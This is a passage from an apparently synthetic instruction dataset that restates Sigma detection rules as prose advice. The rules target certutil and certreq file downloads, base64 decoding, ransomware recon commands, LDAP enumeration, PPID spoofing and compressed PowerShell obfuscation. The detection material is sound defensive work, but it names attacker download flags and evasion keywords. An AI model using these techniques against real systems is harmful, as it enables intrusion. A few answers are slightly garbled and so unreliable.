    "output": "Certainly!\n\nIn order to detect potential adversaries accessing the microphone and webcam in an endpoint, you should monitor Windows Security logs for events with IDs 4657, 4656, and 4663 that indicate modifications or attempts to modify the registry entries associated with the permission settings of non-packaged applications for the microphone and webcam. Specifically, lookout for changes in the registry paths '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged' and '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged'. Being vigilant about such modifications can help in identifying unauthorized access to these sensitive resources.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Potential adversaries accessing the microphone and webcam in an endpoint.",
      "answer": "In order to detect potential adversaries accessing the microphone and webcam in an endpoint, you should monitor Windows Security logs for events with IDs 4657, 4656, and 4663 that indicate modifications or attempts to modify the registry entries associated with the permission settings of non-packaged applications for the microphone and webcam. Specifically, lookout for changes in the registry paths '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged' and '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged'. Being vigilant about such modifications can help in identifying unauthorized access to these sensitive resources."
    }
  },
  {
    "instruction": "How to detect: technique used by MAZE ransomware to enumerate directories using Powershell",
    "context": "",
    "output": "In order to detect the technique used by MAZE ransomware to enumerate directories using PowerShell, you should monitor Windows PowerShell script logs. Ensure that Script Block Logging is enabled to capture the necessary data. Look for PowerShell scripts that contain specific keywords all together, which include 'foreach', 'Get-ChildItem', '-Path ', '-ErrorAction ', 'SilentlyContinue', 'Out-File ', and '-append'. These keywords are indicative of a script attempting to enumerate directories silently and potentially log or append the information to a file, a tactic commonly associated with the MAZE ransomware. It's important to be aware that legitimate PowerShell scripts may also use these commands, so some careful analysis might be required to differentiate between malicious and benign activities. This monitoring activity falls into the categories of Execution through Command and Scripting as well as Collection from File and Directory Discovery, which are techniques associated with various cybersecurity threats.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "technique used by MAZE ransomware to enumerate directories using Powershell",
      "answer": "In order to detect the technique used by MAZE ransomware to enumerate directories using PowerShell, you should monitor Windows PowerShell script logs. Ensure that Script Block Logging is enabled to capture the necessary data. Look for PowerShell scripts that contain specific keywords all together, which include 'foreach', 'Get-ChildItem', '-Path ', '-ErrorAction ', 'SilentlyContinue', 'Out-File ', and '-append'. These keywords are indicative of a script attempting to enumerate directories silently and potentially log or append the information to a file, a tactic commonly associated with the MAZE ransomware. It's important to be aware that legitimate PowerShell scripts may also use these commands, so some careful analysis might be required to differentiate between malicious and benign activities. This monitoring activity falls into the categories of Execution through Command and Scripting as well as Collection from File and Directory Discovery, which are techniques associated with various cybersecurity threats."
    }
  },
  {
    "instruction": "How to detect: execution of certutil with certain flags that allow the utility to download files.",
    "context": "",
    "output": "In order to detect the execution of certutil with certain flags that allow the utility to download files, you should monitor for the creation of processes on Windows systems. Specifically, look out for processes where the image name ends with '\\certutil.exe' or where the original file name is 'CertUtil.exe'. It's important to also check the command line arguments for the presence of 'urlcache ' or 'verifyctl ', as these flags are indicative of file download activities. Additionally, be vigilant for command lines containing 'http' which further suggests the downloading of files from the internet. This detection approach requires examining all specified conditions together to reliably identify potentially malicious activity involving the use of certutil to download files. However, be aware that there may be unknown instances that could trigger false positives. The level of concern for such detections is considered medium.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of certutil with certain flags that allow the utility to download files.",
      "answer": "In order to detect the execution of certutil with certain flags that allow the utility to download files, you should monitor for the creation of processes on Windows systems. Specifically, look out for processes where the image name ends with '\\certutil.exe' or where the original file name is 'CertUtil.exe'. It's important to also check the command line arguments for the presence of 'urlcache ' or 'verifyctl ', as these flags are indicative of file download activities. Additionally, be vigilant for command lines containing 'http' which further suggests the downloading of files from the internet. This detection approach requires examining all specified conditions together to reliably identify potentially malicious activity involving the use of certutil to download files. However, be aware that there may be unknown instances that could trigger false positives. The level of concern for such detections is considered medium."
    }
  },
  {
    "instruction": "How can I detect: usage of the \"FromBase64String\" function in the commandline which is used to decode a base64 encoded string",
    "context": "",
    "output": "In order to detect usage of the \"FromBase64String\" function in the command line which is used to decode a base64 encoded string, you should monitor process creation events on Windows platforms. Specifically, look for instances where the command line invocation includes the pattern '::FromBase64String('. This pattern indicates an attempt to decode a base64 encoded string, which can be a tactic employed by attackers to execute encoded payloads or scripts in a manner that evades detection. Be aware that there may be legitimate uses of this function, such as in administrative script libraries; therefore, these occurrences might not always signify malicious activity but should be investigated with a high priority due to the potential risks involved.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of the \"FromBase64String\" function in the commandline which is used to decode a base64 encoded string",
      "answer": "In order to detect usage of the \"FromBase64String\" function in the command line which is used to decode a base64 encoded string, you should monitor process creation events on Windows platforms. Specifically, look for instances where the command line invocation includes the pattern '::FromBase64String('. This pattern indicates an attempt to decode a base64 encoded string, which can be a tactic employed by attackers to execute encoded payloads or scripts in a manner that evades detection. Be aware that there may be legitimate uses of this function, such as in administrative script libraries; therefore, these occurrences might not always signify malicious activity but should be investigated with a high priority due to the potential risks involved."
    }
  },
  {
    "instruction": "How to detect: potential Active Directory enumeration via LDAP",
    "context": "",
    "output": "In order to detect potential Active Directory enumeration via LDAP, you should monitor for specific patterns and searches in LDAP debug logs under the Windows LDAP Client Debug ETW logging category. The detection strategy encompasses several key aspects:\n\n1. **Log Source**: Focus on the LDAP debug logging for the event ID 30. This is crucial for identifying the execution of Active Directory enumeration operations.\n\n2. **Detection Criteria**: Look for searches that match specific criteria indicating potential enumeration activities. These include searches for various Active Directory objects and attributes, such as groups, users, computers, organizational units, domain policies, and more. Specifically, queries containing filters for group types, SAM account types, object categories, object classes, and primary group IDs are indicative of enumeration attempts. Such searches might attempt to list sensitive groups like Domain Admins or query based on unique identifiers like objectGUID or schemaIDGUID.\n\n3. **Suspicious Flags**: Additional focus should be placed on searches that include suspicious flags within the UserAccountControl attribute, checks for admin rights (adminCount=1), special flags indicating permissions to act on behalf of other identities, or passwords within managed service accounts. Searches that inquire about account expiration or delegation permissions are also suspect.\n\n4. **Narrowing Down Specificity**: Not all searches are suspicious, and the context is key. Searches that uniquely identify objects by domain SID or object SID without corresponding suspicious criteria are less likely to be part of active enumeration and could be legitimate queries.\n\n5. **Condition for Alerting**: Alerts should be generated when there are searches that meet the generic, suspicious criteria without being narrowly focused on specific identifiers, or if any searches contain suspicious flags regardless of specificity.\n\nBy monitoring and analyzing LDAP debug logs for these indicators, organizations can identify and investigate potential unauthorized Active Directory enumeration activities. These are tagged under tactics and techniques such as Discovery and Credential Access, highlighting the use of these enumeration techniques by attackers to gather information or escalate privileges within a network.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential Active Directory enumeration via LDAP",
      "answer": "In order to detect potential Active Directory enumeration via LDAP, you should monitor for specific patterns and searches in LDAP debug logs under the Windows LDAP Client Debug ETW logging category. The detection strategy encompasses several key aspects:\n\n1. **Log Source**: Focus on the LDAP debug logging for the event ID 30. This is crucial for identifying the execution of Active Directory enumeration operations.\n\n2. **Detection Criteria**: Look for searches that match specific criteria indicating potential enumeration activities. These include searches for various Active Directory objects and attributes, such as groups, users, computers, organizational units, domain policies, and more. Specifically, queries containing filters for group types, SAM account types, object categories, object classes, and primary group IDs are indicative of enumeration attempts. Such searches might attempt to list sensitive groups like Domain Admins or query based on unique identifiers like objectGUID or schemaIDGUID.\n\n3. **Suspicious Flags**: Additional focus should be placed on searches that include suspicious flags within the UserAccountControl attribute, checks for admin rights (adminCount=1), special flags indicating permissions to act on behalf of other identities, or passwords within managed service accounts. Searches that inquire about account expiration or delegation permissions are also suspect.\n\n4. **Narrowing Down Specificity**: Not all searches are suspicious, and the context is key. Searches that uniquely identify objects by domain SID or object SID without corresponding suspicious criteria are less likely to be part of active enumeration and could be legitimate queries.\n\n5. **Condition for Alerting**: Alerts should be generated when there are searches that meet the generic, suspicious criteria without being narrowly focused on specific identifiers, or if any searches contain suspicious flags regardless of specificity.\n\nBy monitoring and analyzing LDAP debug logs for these indicators, organizations can identify and investigate potential unauthorized Active Directory enumeration activities. These are tagged under tactics and techniques such as Discovery and Credential Access, highlighting the use of these enumeration techniques by attackers to gather information or escalate privileges within a network."
    }
  },
  {
    "instruction": "Can you explain how to detect: an image load pattern as seen when a tool named PRIVATELOG is used and rarely observed under legitimate circumstances",
    "context": "",
    "output": "Certainly!\n\nIn order to Detects an image load pattern as seen when a tool named PRIVATELOG is used and rarely observed under legitimate circumstances, you should: Focus on monitoring image load activities within Windows. Specifically, watch for instances where the executable 'svchost.exe' loads the dynamic link library 'clfsw32.dll'. This particular pattern of behavior is associated with the use of the tool PRIVATELOG, and it's seldom seen in normal operations, indicating a potentially malicious action. Despite being a strong indicator of suspicious activity, be mindful that it might occur in rare legitimate scenarios. Thus, it's classified with a high level of concern due to its unusual nature and potential security implications.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "an image load pattern as seen when a tool named PRIVATELOG is used and rarely observed under legitimate circumstances",
      "answer": "In order to Detects an image load pattern as seen when a tool named PRIVATELOG is used and rarely observed under legitimate circumstances, you should: Focus on monitoring image load activities within Windows. Specifically, watch for instances where the executable 'svchost.exe' loads the dynamic link library 'clfsw32.dll'. This particular pattern of behavior is associated with the use of the tool PRIVATELOG, and it's seldom seen in normal operations, indicating a potentially malicious action. Despite being a strong indicator of suspicious activity, be mindful that it might occur in rare legitimate scenarios. Thus, it's classified with a high level of concern due to its unusual nature and potential security implications."
    }
  },
  {
    "instruction": "How to detect: Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet.",
    "context": "",
    "output": "In order to remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet, you should: Monitor Windows PowerShell script activities, specifically looking out for scripts that include both 'Unblock-File ' and '-Path ' commands in the script block text. These indicators suggest that a script is attempting to remove the mark of a file being downloaded from the internet, an action commonly associated with bypassing security measures. Ensure that Script Block Logging is enabled on the system to capture the necessary data. Be aware that legitimate PowerShell scripts might also perform similar actions, so it's important to differentiate between benign usage and potential security threats. The security level for this type of detection is considered medium.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet.",
      "answer": "In order to remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet, you should: Monitor Windows PowerShell script activities, specifically looking out for scripts that include both 'Unblock-File ' and '-Path ' commands in the script block text. These indicators suggest that a script is attempting to remove the mark of a file being downloaded from the internet, an action commonly associated with bypassing security measures. Ensure that Script Block Logging is enabled on the system to capture the necessary data. Be aware that legitimate PowerShell scripts might also perform similar actions, so it's important to differentiate between benign usage and potential security threats. The security level for this type of detection is considered medium."
    }
  },
  {
    "instruction": "How to detect: activity when a security-enabled global group is deleted",
    "context": "",
    "output": "In order to detect activity when a security-enabled global group is deleted, you should monitor the security logs from Windows systems for events with Event ID 4730 or 634. These specific Event IDs indicate that a security-enabled global group was deleted. By tracking these Event IDs within the Windows security service logs, it's possible to identify when such significant changes occur within group management activities. It's important to note, however, that the confidence in these detections might be considered low due to the potential for unknown false positives. This activity can be linked with tactics and techniques focused on undermining security control and manipulating user group configurations, which could be indicative of unauthorized access or malicious influence on security protocols.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "activity when a security-enabled global group is deleted",
      "answer": "In order to detect activity when a security-enabled global group is deleted, you should monitor the security logs from Windows systems for events with Event ID 4730 or 634. These specific Event IDs indicate that a security-enabled global group was deleted. By tracking these Event IDs within the Windows security service logs, it's possible to identify when such significant changes occur within group management activities. It's important to note, however, that the confidence in these detections might be considered low due to the potential for unknown false positives. This activity can be linked with tactics and techniques focused on undermining security control and manipulating user group configurations, which could be indicative of unauthorized access or malicious influence on security protocols."
    }
  },
  {
    "instruction": "How to detect: Rorschach ransomware execution activity",
    "context": "",
    "output": "In order to detect Rorschach ransomware execution activity, you should: focus on monitoring process creation logs within Windows systems. Specifically, look out for processes that end with paths to the following executables: bcdedit.exe, net.exe, net1.exe, netsh.exe, wevtutil.exe, and vssadmin.exe, which are key indicators. Additionally, any command line arguments that contain '11111111' should raise an alarm. The occurrence of these conditions suggests a critical level of threat, and, although false positives are considered unlikely, they should always be verified to confirm the presence of Rorschach ransomware activity.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Rorschach ransomware execution activity",
      "answer": "In order to detect Rorschach ransomware execution activity, you should: focus on monitoring process creation logs within Windows systems. Specifically, look out for processes that end with paths to the following executables: bcdedit.exe, net.exe, net1.exe, netsh.exe, wevtutil.exe, and vssadmin.exe, which are key indicators. Additionally, any command line arguments that contain '11111111' should raise an alarm. The occurrence of these conditions suggests a critical level of threat, and, although false positives are considered unlikely, they should always be verified to confirm the presence of Rorschach ransomware activity."
    }
  },
  {
    "instruction": "How can I detect: usage of winget to install applications via manifest file. Adversaries can abuse winget to download payloads remotely and execute them.\nThe manifest option enables you to install an application by passing in a YAML file directly to the client.\nWinget can be used to download and install exe, msi or msix files later.\n",
    "context": "",
    "output": "In order to detect usage of winget to install applications via manifest file. Adversaries can abuse winget to download payloads remotely and execute them. The manifest option enables you to install an application by passing in a YAML file directly to the client. Winget can be used to download and install exe, msi, or msix files later, you should monitor process creation events in Windows for executions of winget.exe, specifically looking for instances where the command line contains install phrases or explicitly references a manifest file using '-m' or '--manifest' options. This allows for identification of potential malicious usage of winget, such as remote payload downloads and executions through application installations not typically seen in normal environments. Be mindful, however, that in certain environments, legitimate use of this functionality for installing and testing custom applications might generate some false positives, so a medium alert level is recommended to balance sensitivity with the potential for legitimate use.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of winget to install applications via manifest file. Adversaries can abuse winget to download payloads remotely and execute them.\nThe manifest option enables you to install an application by passing in a YAML file directly to the client.\nWinget can be used to download and install exe, msi or msix files later.\n",
      "answer": "In order to detect usage of winget to install applications via manifest file. Adversaries can abuse winget to download payloads remotely and execute them. The manifest option enables you to install an application by passing in a YAML file directly to the client. Winget can be used to download and install exe, msi, or msix files later, you should monitor process creation events in Windows for executions of winget.exe, specifically looking for instances where the command line contains install phrases or explicitly references a manifest file using '-m' or '--manifest' options. This allows for identification of potential malicious usage of winget, such as remote payload downloads and executions through application installations not typically seen in normal environments. Be mindful, however, that in certain environments, legitimate use of this functionality for installing and testing custom applications might generate some false positives, so a medium alert level is recommended to balance sensitivity with the potential for legitimate use."
    }
  },
  {
    "instruction": "How to detect: suspicious certreq execution taken from the LOLBAS examples, which can be abused to download (small) files",
    "context": "",
    "output": "In order to detect a suspicious certreq execution taken from the LOLBAS examples, which can be abused to download (small) files, you should focus on monitoring the creation of processes within Windows systems. Specifically, identify instances where the process image ends with '\\certreq.exe' or the original file name is identified as 'CertReq.exe'. Additionally, scrutinize the command line arguments for the presence of ' -Post ', ' -config ', ' http', and the specific reference to ' C:\\windows\\win.ini '. These particular command line argument combinations are indicative of an attempt to misuse certreq.exe for downloading files, an activity that could be aligned with malicious operations. Command line monitoring along with tracking the parent command line execution can greatly aid in detecting this type of attack. The methodology for detection holds a high importance level due to the low likelihood of false positives under normal operational conditions. This approach ensures that activities related to the misuse of certreq for file downloading purposes are accurately identified and scrutinized.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious certreq execution taken from the LOLBAS examples, which can be abused to download (small) files",
      "answer": "In order to detect a suspicious certreq execution taken from the LOLBAS examples, which can be abused to download (small) files, you should focus on monitoring the creation of processes within Windows systems. Specifically, identify instances where the process image ends with '\\certreq.exe' or the original file name is identified as 'CertReq.exe'. Additionally, scrutinize the command line arguments for the presence of ' -Post ', ' -config ', ' http', and the specific reference to ' C:\\windows\\win.ini '. These particular command line argument combinations are indicative of an attempt to misuse certreq.exe for downloading files, an activity that could be aligned with malicious operations. Command line monitoring along with tracking the parent command line execution can greatly aid in detecting this type of attack. The methodology for detection holds a high importance level due to the low likelihood of false positives under normal operational conditions. This approach ensures that activities related to the misuse of certreq for file downloading purposes are accurately identified and scrutinized."
    }
  },
  {
    "instruction": "How to detect: execution of the built-in script located in \"C:\\Windows\\System32\\gatherNetworkInfo.vbs\". Which can be used to gather information about the target machine",
    "context": "",
    "output": "In order to detect execution of the built-in script located in \"C:\\Windows\\System32\\gatherNetworkInfo.vbs\", which can be used to gather information about the target machine, you should monitor process creation events on Windows systems for any command line execution that includes 'gatherNetworkInfo.vbs'. It's crucial to exclude processes where the command line execution image ends with '\\cscript.exe' or '\\wscript.exe' to reduce false positives. This approach is designed to identify potential reconnaissance activity where adversaries attempt to gather valuable information about the network configuration and settings of the target machine. The associated tactics and techniques based on the MITRE ATT&CK framework for this detection include Discovery and Scripting. It is important to note that the reliability of this detection is high, but unknown false positives may occur, implying a need for further investigation into any alerts generated from this detection strategy.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of the built-in script located in \"C:\\Windows\\System32\\gatherNetworkInfo.vbs\". Which can be used to gather information about the target machine",
      "answer": "In order to detect execution of the built-in script located in \"C:\\Windows\\System32\\gatherNetworkInfo.vbs\", which can be used to gather information about the target machine, you should monitor process creation events on Windows systems for any command line execution that includes 'gatherNetworkInfo.vbs'. It's crucial to exclude processes where the command line execution image ends with '\\cscript.exe' or '\\wscript.exe' to reduce false positives. This approach is designed to identify potential reconnaissance activity where adversaries attempt to gather valuable information about the network configuration and settings of the target machine. The associated tactics and techniques based on the MITRE ATT&CK framework for this detection include Discovery and Scripting. It is important to note that the reliability of this detection is high, but unknown false positives may occur, implying a need for further investigation into any alerts generated from this detection strategy."
    }
  },
  {
    "instruction": "Explain how should I detect the following: possible NTLM coercion via certutil using the 'syncwithWU' flag",
    "context": "",
    "output": "In order to detect possible NTLM coercion via certutil using the 'syncwithWU' flag, you should: Monitor process creation events on Windows systems for the execution of 'certutil.exe'. Specifically, look for instances where the process image ends with '\\certutil.exe' or has 'CertUtil.exe' as the OriginalFileName. Additionally, pay attention to the command line arguments, ensuring that they contain both ' -syncwithWU ' and a double backslash ('\\\\\\\\'). These criteria must all be met in order to flag a potential NTLM coercion attempt. It is important to be cautious as there might be unknown legitimate uses of these command line arguments, however, the combination specified typically indicates a high level of threat.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "possible NTLM coercion via certutil using the 'syncwithWU' flag",
      "answer": "In order to detect possible NTLM coercion via certutil using the 'syncwithWU' flag, you should: Monitor process creation events on Windows systems for the execution of 'certutil.exe'. Specifically, look for instances where the process image ends with '\\certutil.exe' or has 'CertUtil.exe' as the OriginalFileName. Additionally, pay attention to the command line arguments, ensuring that they contain both ' -syncwithWU ' and a double backslash ('\\\\\\\\'). These criteria must all be met in order to flag a potential NTLM coercion attempt. It is important to be cautious as there might be unknown legitimate uses of these command line arguments, however, the combination specified typically indicates a high level of threat."
    }
  },
  {
    "instruction": "Please help me detect the following: exploitation attempt using public exploit code for CVE-2018-15473",
    "context": "",
    "output": "Sure!\nIn order to detect exploitation attempt using public exploit code for CVE-2018-15473, you should monitor SSHD logs on Linux systems for the specific error message \"error: buffer_get_ret: trying to get more bytes 1907 than in buffer 308 [preauth]\". This message can indicate an attempted exploitation of the vulnerability mentioned. The detection relies on spotting this exact keyword within the logs. It is important to pay attention to logs sourced from the SSHD service on Linux-operated machines, as this scenario specifically targets them. While there might be unknown scenarios leading to false positives, the significance of detecting this exploit attempt is rated at a medium level. The associated tactics and techniques from the MITRE ATT&CK framework include Credential Access and Brute Force, although these tags are not explicitly named in the detection criteria, they are relevant to understanding the context of the attack.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "exploitation attempt using public exploit code for CVE-2018-15473",
      "answer": "In order to detect exploitation attempt using public exploit code for CVE-2018-15473, you should monitor SSHD logs on Linux systems for the specific error message \"error: buffer_get_ret: trying to get more bytes 1907 than in buffer 308 [preauth]\". This message can indicate an attempted exploitation of the vulnerability mentioned. The detection relies on spotting this exact keyword within the logs. It is important to pay attention to logs sourced from the SSHD service on Linux-operated machines, as this scenario specifically targets them. While there might be unknown scenarios leading to false positives, the significance of detecting this exploit attempt is rated at a medium level. The associated tactics and techniques from the MITRE ATT&CK framework include Credential Access and Brute Force, although these tags are not explicitly named in the detection criteria, they are relevant to understanding the context of the attack."
    }
  },
  {
    "instruction": "Can you explain how to detect: possible successful exploitation for vulnerability described in CVE-2021-26858 by looking for \ncreation of non-standard files on disk by Exchange Server\u2019s Unified Messaging service\nwhich could indicate dropping web shells or other malicious content\n",
    "context": "",
    "output": "Certainly!\n\nIn order to detect possible successful exploitation for the vulnerability described in CVE-2021-26858 by looking for the creation of non-standard files on disk by Exchange Server\u2019s Unified Messaging service, which could indicate dropping web shells or other malicious content, you should: Monitor file events in Windows environments, specifically focusing on actions performed by 'UMWorkerProcess.exe', the Unified Messaging Worker Process related to Exchange Server. Be on alert for the creation of new files that do not end with common file extensions used by this service such as 'CacheCleanup.bin', '.txt', '.LOG', '.cfg', or 'cleanup.bin'. The detection of file creation activities by 'UMWorkerProcess.exe' that do not fall into these filtered categories may indicate an attempt to exploit the system by dropping potentially malicious content onto the server. Key information such as the computer name and the names of the created files should be recorded for further investigation. This approach is crucial in identifying and responding to sophisticated attacks aiming to exploit known vulnerabilities in Exchange Server, particularly CVE-2021-26858. It's important to note that due to the specificity of this detection method, the likelihood of false positives is currently unknown, but the severity of potential exploitation makes it a high-priority concern.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "possible successful exploitation for vulnerability described in CVE-2021-26858 by looking for \ncreation of non-standard files on disk by Exchange Server\u2019s Unified Messaging service\nwhich could indicate dropping web shells or other malicious content\n",
      "answer": "In order to detect possible successful exploitation for the vulnerability described in CVE-2021-26858 by looking for the creation of non-standard files on disk by Exchange Server\u2019s Unified Messaging service, which could indicate dropping web shells or other malicious content, you should: Monitor file events in Windows environments, specifically focusing on actions performed by 'UMWorkerProcess.exe', the Unified Messaging Worker Process related to Exchange Server. Be on alert for the creation of new files that do not end with common file extensions used by this service such as 'CacheCleanup.bin', '.txt', '.LOG', '.cfg', or 'cleanup.bin'. The detection of file creation activities by 'UMWorkerProcess.exe' that do not fall into these filtered categories may indicate an attempt to exploit the system by dropping potentially malicious content onto the server. Key information such as the computer name and the names of the created files should be recorded for further investigation. This approach is crucial in identifying and responding to sophisticated attacks aiming to exploit known vulnerabilities in Exchange Server, particularly CVE-2021-26858. It's important to note that due to the specificity of this detection method, the likelihood of false positives is currently unknown, but the severity of potential exploitation makes it a high-priority concern."
    }
  },
  {
    "instruction": "How to detect: execution of a set of builtin commands often used in recon stages by different attack groups",
    "context": "",
    "output": "In order to detect execution of a set of built-in commands often used in recon stages by different attack groups, you should monitor the process creation logs on Windows systems. Focus on identifying the execution of specific built-in command-line utilities that attackers frequently use for reconnaissance to gather information about the system, network, and users. These commands include `tasklist`, `net time`, `systeminfo`, `whoami`, `nbtstat`, `net start`, `qprocess`, `nslookup`, `hostname.exe`, and `netstat -an`, along with commands ending with specific patterns like `\\net1 start`, `\\net1 user /domain`, `\\net1 group /domain`, `\\net1 group \"domain admins\" /domain`, `\\net1 group \"Exchange Trusted Subsystem\" /domain`, `\\net1 accounts /domain`, and `\\net1 user net localgroup administrators`.\n\nTo effectively detect potential reconnaissance activity, aggregate the counts of these command executions within a short timeframe, specifically within 15 seconds. If more than four instances of these command executions are observed during this timeframe, it could indicate suspicious activity indicative of the initial reconnaissance phase of an attack. \n\nHowever, it's important to consider that these commands can also be used by legitimate scripts and administrative tools within an enterprise environment. Thus, the identification of these commands could lead to false positives. The severity level of these detections is considered medium. Mitigation strategies should take into account the context in which these commands are executed, including an assessment of whether their use is typical for the monitored environment. \n\nUnderstanding the tactics and techniques associated with these reconnaissance activities can aid organizations in defending against attack groups. The commands targeted for detection are common to a variety of tactics such as Discovery, which involves an adversary attempting to gather information they can use to plan subsequent operations; examples include system network configuration discovery, system information discovery, and domain trust discovery.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of a set of builtin commands often used in recon stages by different attack groups",
      "answer": "In order to detect execution of a set of built-in commands often used in recon stages by different attack groups, you should monitor the process creation logs on Windows systems. Focus on identifying the execution of specific built-in command-line utilities that attackers frequently use for reconnaissance to gather information about the system, network, and users. These commands include `tasklist`, `net time`, `systeminfo`, `whoami`, `nbtstat`, `net start`, `qprocess`, `nslookup`, `hostname.exe`, and `netstat -an`, along with commands ending with specific patterns like `\\net1 start`, `\\net1 user /domain`, `\\net1 group /domain`, `\\net1 group \"domain admins\" /domain`, `\\net1 group \"Exchange Trusted Subsystem\" /domain`, `\\net1 accounts /domain`, and `\\net1 user net localgroup administrators`.\n\nTo effectively detect potential reconnaissance activity, aggregate the counts of these command executions within a short timeframe, specifically within 15 seconds. If more than four instances of these command executions are observed during this timeframe, it could indicate suspicious activity indicative of the initial reconnaissance phase of an attack. \n\nHowever, it's important to consider that these commands can also be used by legitimate scripts and administrative tools within an enterprise environment. Thus, the identification of these commands could lead to false positives. The severity level of these detections is considered medium. Mitigation strategies should take into account the context in which these commands are executed, including an assessment of whether their use is typical for the monitored environment. \n\nUnderstanding the tactics and techniques associated with these reconnaissance activities can aid organizations in defending against attack groups. The commands targeted for detection are common to a variety of tactics such as Discovery, which involves an adversary attempting to gather information they can use to plan subsequent operations; examples include system network configuration discovery, system information discovery, and domain trust discovery."
    }
  },
  {
    "instruction": "Please help me detect the following: Obfuscated Powershell via COMPRESS OBFUSCATION",
    "context": "",
    "output": "Sure!\nIn order to detect obfuscated PowerShell via COMPRESS OBFUSCATION, you should: Monitor Windows driver loads for specific indications of obfuscated PowerShell scripts. Look for scripts that contain both 'new-object' and 'text.encoding]::ascii' within their ImagePath. Additionally, check if 'system.io.compression.deflatestream' or 'system.io.streamreader' are part of the ImagePath. A significant red flag is when the ImagePath ends with 'readtoend', indicating a potential script that decompresses and reads obfuscated code into memory for execution. This detection mechanism is crucial for identifying attempts at defense evasion and execution via obfuscated scripts, associated with the tactics and techniques of defense evasion (T1027) and command and script interpreter (T1059.001). Be aware that there might be unknown scenarios that could trigger false positives, rating this detection with a medium level of confidence.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Obfuscated Powershell via COMPRESS OBFUSCATION",
      "answer": "In order to detect obfuscated PowerShell via COMPRESS OBFUSCATION, you should: Monitor Windows driver loads for specific indications of obfuscated PowerShell scripts. Look for scripts that contain both 'new-object' and 'text.encoding]::ascii' within their ImagePath. Additionally, check if 'system.io.compression.deflatestream' or 'system.io.streamreader' are part of the ImagePath. A significant red flag is when the ImagePath ends with 'readtoend', indicating a potential script that decompresses and reads obfuscated code into memory for execution. This detection mechanism is crucial for identifying attempts at defense evasion and execution via obfuscated scripts, associated with the tactics and techniques of defense evasion (T1027) and command and script interpreter (T1059.001). Be aware that there might be unknown scenarios that could trigger false positives, rating this detection with a medium level of confidence."
    }
  },
  {
    "instruction": "How can I detect: use of parent process ID spoofing tools like Didier Stevens tool SelectMyParent",
    "context": "",
    "output": "In order to detect the use of parent process ID spoofing tools like Didier Stevens tool SelectMyParent, you should: Monitor Windows process creation logs for instances where specific criteria are met. Check for processes being created with the image name ending in '\\SelectMyParent.exe'. Review the command line arguments to identify the use of keywords related to PPID spoofing, including 'PPID-spoof', 'ppid_spoof', 'spoof-ppid', 'spoof_ppid', 'ppidspoof', 'spoofppid', 'spoofedppid', and '-spawnto'. Additionally, inspect the OriginalFileName field for similar PPID spoofing indicators. Also, look for processes with the description 'SelectMyParent'. Pay close attention to the import hash (Imphash) values, specifically '04d974875bd225f00902b4cad9af3fbc', 'a782af154c9e743ddf3f3eb2b8f3d16e', '89059503d7fbf470e68f7e63313da3ad', and 'ca28337632625c8281ab8a130b3d6bad'. Lastly, verify hashes reported in the logs for matches with known indicators. This detection strategy is based on a high level of confidence that these activities are indicative of parent process ID spoofing, which is related to tactics and techniques including execution, defense evasion, and privilege escalation.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "use of parent process ID spoofing tools like Didier Stevens tool SelectMyParent",
      "answer": "In order to detect the use of parent process ID spoofing tools like Didier Stevens tool SelectMyParent, you should: Monitor Windows process creation logs for instances where specific criteria are met. Check for processes being created with the image name ending in '\\SelectMyParent.exe'. Review the command line arguments to identify the use of keywords related to PPID spoofing, including 'PPID-spoof', 'ppid_spoof', 'spoof-ppid', 'spoof_ppid', 'ppidspoof', 'spoofppid', 'spoofedppid', and '-spawnto'. Additionally, inspect the OriginalFileName field for similar PPID spoofing indicators. Also, look for processes with the description 'SelectMyParent'. Pay close attention to the import hash (Imphash) values, specifically '04d974875bd225f00902b4cad9af3fbc', 'a782af154c9e743ddf3f3eb2b8f3d16e', '89059503d7fbf470e68f7e63313da3ad', and 'ca28337632625c8281ab8a130b3d6bad'. Lastly, verify hashes reported in the logs for matches with known indicators. This detection strategy is based on a high level of confidence that these activities are indicative of parent process ID spoofing, which is related to tactics and techniques including execution, defense evasion, and privilege escalation."
    }
  },
  {
